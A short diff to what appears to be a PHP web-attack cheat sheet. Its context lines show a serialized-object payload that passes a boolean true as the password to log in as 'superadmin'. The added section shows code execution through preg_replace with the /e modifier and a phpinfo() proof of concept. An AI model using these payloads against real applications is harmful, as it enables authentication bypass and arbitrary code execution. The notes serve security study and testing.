@@ -173,3 +173,12 @@ If we set the password not to a string but to '1' (True) it will work because st
 
 	a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
 	
+## PREG_REPLACE()
+
+You can execute php code with the function preg_replace()
+
+Pattern : /a/e
+
+Replace : phpinfo();
+
+Content : a
